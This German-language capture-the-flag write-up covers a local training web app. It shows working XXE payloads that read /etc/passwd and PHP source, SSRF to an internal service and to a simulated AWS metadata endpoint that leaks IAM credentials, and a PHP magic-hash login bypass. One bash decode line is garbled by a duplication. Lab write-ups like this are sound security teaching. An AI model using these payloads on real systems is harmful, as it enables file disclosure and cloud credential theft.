# Writeup – DataSync Portal
---

## Flag 1 – XXE (XML External Entity Injection)

**Endpunkt:** `http://localhost:8000/xml-import.php`

**Idee:** Die Seite parst vom Nutzer eingereichten XML-Code. Der XML-Parser ist mit
`LIBXML_NOENT | LIBXML_DTDLOAD` konfiguriert, was das Laden externer Entitäten erlaubt.
Ein Angreifer kann im DTD eine Entität definieren, die auf eine lokale Datei zeigt —
der Dateiinhalt wird dann im Output der Seite angezeigt.

### Schritt 1 – Bestätigung: externer Entity-Support vorhanden

Folgenden XML-Payload einreichen um zu prüfen ob der Parser externe Entitäten auflöst:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<records>
  <record><name>check</name><value>&xxe;</value></record>
</records>
```

**Erwartetes Ergebnis:** Der Inhalt von `/etc/passwd` erscheint in der Value-Spalte.
Der User `php` mit uid 1000 ist sichtbar — das bestätigt, dass der Parser serverseitige
Dateien liest und deren Inhalt ausgibt.

### Schritt 2 – Flag lesen

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY flag SYSTEM "file:///etc/flag.txt">
]>
<records>
  <record><name>flag</name><value>&flag;</value></record>
</records>
```

**Ergebnis:** **Flag 1** erscheint in der Value-Spalte: `FLAG_PLACEHOLDER_xxe`

### Bonus – Source Code lesen (Vorbereitung für Flag 3)

XXE erlaubt auch das Lesen von PHP-Quelldateien. Das ist der Einstieg in die
Exploit-Kette: Man liest `login.php` und entdeckt darin den gespeicherten Hash
und den unsicheren `==`-Vergleich:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY src SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/login.php">]>
<records>
  <record><name>src</name><value>&src;</value></record>
</records>
```
-> Man kann hier den Inhalt der PHP-Datei als Base64-String auslesen, da die PHP-Datei selbst nicht direkt ausgegeben werden kann. Anschließend lässt sich der String im Terminal wieder decodieren.

```bash
echo "HIER_DEN_BASE64_STRING" | base64 -decho "HIER_DEN_BASE64_STRING" | base64 -d
```

**Ergebnis:** Quellcode von `login.php` erscheint. Darin sichtbar:
- `define('ADMIN_TOKEN_HASH', '0e462097431906509019562988736854')`
- Vergleich mit `==` statt `===`

Das sind alle Informationen die für Flag 3 benötigt werden.

### Bonus – XXE als SSRF-Vektor
Beim Lesen von `login.php` über XXE fällt ein Hinweis auf was `http://secret-service/` enthält. Dieser interne Dienst lässt sich auch direkt über XXE erreichen. Das ist gleichzeitig der Einstieg für Flag 2. 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY ssrf SYSTEM "http://secret-service/">
]>
<records>
  <record><name>result</name><value>&ssrf;</value></record>
</records>
```

**Ergebnis:** `FLAG_PLACEHOLDER_ssrf` — dieselbe Flag wie bei Flag 2, aber über
einen alternativen Angriffsweg (XXE statt SSRF via url-preview.php).

---

## Flag 2 – SSRF (Server-Side Request Forgery)

**Endpunkt:** `http://localhost:8000/url-preview.php`

**Idee:** Die Seite fetcht eine vom Nutzer angegebene URL über `curl_exec()` und zeigt
den Response-Body an. Es gibt keine Prüfung ob die URL auf interne Hosts zeigt. Der
Container `secret-service` läuft im selben Docker-Netzwerk, hat aber keinen nach außen
gemappten Port — er ist also direkt im Browser nicht erreichbar. Über `url-preview.php`
kann der Angreifer den Web-Server als Proxy missbrauchen.

### Schritt 1 – Fetch-Funktion bestätigen

URL eingeben: `https://example.com` -> Der HTML-Inhalt von example.com erscheint.
Bestätigt: Die Seite fetcht beliebige URLs.

### Schritt 2 – Internen Dienst erreichen

URL eingeben:
```
http://secret-service/
```
-> URL kann im Flag 1 oder im Flag 3 gefunden werden.

**Ergebnis:** **Flag 2** erscheint im Preview: `FLAG_PLACEHOLDER_ssrf`

---

## Flag 3 – PHP Type Juggling (Magic Hash)

**Endpunkt:** `http://localhost:8000/login.php`

**Idee:** Das Login-System speichert einen MD5-Hash des Admin-Tokens und vergleicht
ihn beim Login mit `==` (losem Vergleich statt `===`). In PHP werden Strings die dem
Muster `0e[0-9]+` entsprechen als wissenschaftliche Notation interpretiert und in
den Float `0.0` umgewandelt. Zwei solcher Strings sind daher `==` gleich — egal wie
unterschiedlich sie tatsächlich sind. Solche Werte heißen "Magic Hashes" und sind
öffentlich dokumentiert.

Der gespeicherte Hash ist: `0e462097431906509019562988736854`
(= `md5("240610708")`)

### Schritt 1 – Verhalten beobachten

Beliebigen String eintippen (z.B. `test`) und absenden.

**Ergebnis:** Fehlermeldung zeigt den submitted Hash an, z.B.
`submitted hash: 098f6bcd4621d373cade4e832627b4f6`

Das bestätigt: Das System berechnet `md5(input)` und vergleicht das Ergebnis.

### Schritt 2 – Magic Hash identifizieren

Der gespeicherte Hash `0e462097431906509019562988736854` beginnt mit `0e` gefolgt
von nur Ziffern. (Das weiß man weil man den Quellcode von login.php vorher per XXE gelesen hat.)
PHP interpretiert das als `0 × 10^462... = 0.0`.

Gesucht ist ein Input dessen MD5-Hash ebenfalls mit `0e` beginnt und nur Ziffern
enthält. Solche Werte sind öffentlich bekannt:

Token: `240610708` 
MD5-Hash: `0e462097431906509019562988736854` |


### Schritt 3 – Einloggen

Token `240610708` eingeben und absenden.

PHP berechnet: `md5("240610708") = 0e462097431906509019562988736854`

Vergleich: `'0e462097431906509019562988736854' == '0e462097431906509019562988736854'` -> `true`

**Ergebnis:** **Flag 3** erscheint: `FLAG_PLACEHOLDER_type_juggling`

Nach dem Login erscheint außerdem ein Hint:
*"An internal microservice is running at `http://secret-service/` — not reachable from outside."*

---

## Flag 4 – SSRF auf simulierten Cloud-Metadata-Dienst

**Endpunkt:** `http://localhost:8000/url-preview.php`

**Idee:** In echten Cloud-Umgebungen (AWS EC2) ist unter `http://169.254.169.254/`
ein Metadata-Service erreichbar der temporäre IAM-Credentials enthält. Ein Angreifer
der SSRF ausnutzen kann, erhält diese Credentials und bekommt damit potenziell vollen
Zugriff auf den Cloud-Account (reales Beispiel: Capital One Hack 2019).

In dieser Challenge simuliert der Container `metadata` diesen Dienst unter dem
Hostnamen `metadata.internal`. Der Hinweis darauf findet sich:
- im HTML-Kommentar der Startseite (`Rechtsklick -> Seitenquelltext anzeigen`)

### Schritt 1 – Endpunkt erkunden

```
http://metadata.internal/
```
-> Gibt zurück: `1.0 / 2007-01-19 / latest` — identisch mit dem echten AWS IMDS.

### Schritt 2 – Pfade navigieren

```
http://metadata.internal/latest/meta-data/
```
-> Listet verfügbare Felder, darunter `iam/`.

```
http://metadata.internal/latest/meta-data/iam/security-credentials/
```
-> Gibt den Rollennamen `datasync-role` zurück.

### Schritt 3 – Credentials abrufen

```
http://metadata.internal/latest/meta-data/iam/security-credentials/datasync-role
```

-> Gibt JSON zurück:
```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAXXXXXXXXXXXXXXXQ",
  "SecretAccessKey": "FLAG_PLACEHOLDER_metadata",
  ...
}
```

**Ergebnis:** **Flag 4** steckt im Feld `SecretAccessKey`: `FLAG_PLACEHOLDER_metadata`

---